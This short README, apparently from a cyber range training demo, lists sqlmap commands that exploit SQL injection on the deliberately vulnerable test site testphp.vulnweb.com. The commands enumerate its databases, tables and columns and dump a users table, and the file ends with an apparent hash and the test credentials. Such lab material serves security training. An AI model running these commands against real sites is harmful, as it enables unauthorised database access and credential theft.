# kypo-crp-demo-training-ubuntu

USE SQLMAP

cd to sqlmap-dev folder

use [Home of Acunetix Art (vulnweb.com)](http://testphp.vulnweb.com/)

python3 sqlmap.py -u "http://testphp.vulnweb.com/search.php?test=query"

python3 sqlmap.py -u "http://testphp.vulnweb.com/search.php?test=query" -dbs

python3 sqlmap.py -u "http://testphp.vulnweb.com/search.php?test=query" --tables -D acuart

python3 sqlmap.py -u "http://testphp.vulnweb.com/search.php?test=query" --columns -D acuart -T users

python3 sqlmap.py -u "http://testphp.vulnweb.com/search.php?test=query" --dump -D acuart -T users

0331514ec0dc346ead0b43ee816b022f (cart string)

test-test
